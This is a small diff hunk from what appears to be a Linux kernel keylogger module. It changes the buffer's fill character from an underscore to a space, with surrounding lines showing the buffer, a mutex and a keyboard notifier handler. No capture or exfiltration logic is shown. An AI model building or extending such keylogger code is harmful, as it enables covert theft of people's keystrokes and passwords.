@@ -5,7 +5,7 @@ size_t logger_index = 0;
 DEFINE_MUTEX(keylogger_mutex);
 
 void init_keylogger_buffer(void) {
-    memset(keylogger, '_', KEYLOGGER_SIZE);
+    memset(keylogger, ' ', KEYLOGGER_SIZE);
 }
 
 int keylogger_handler(struct notifier_block* nb, unsigned long action, void* data) {
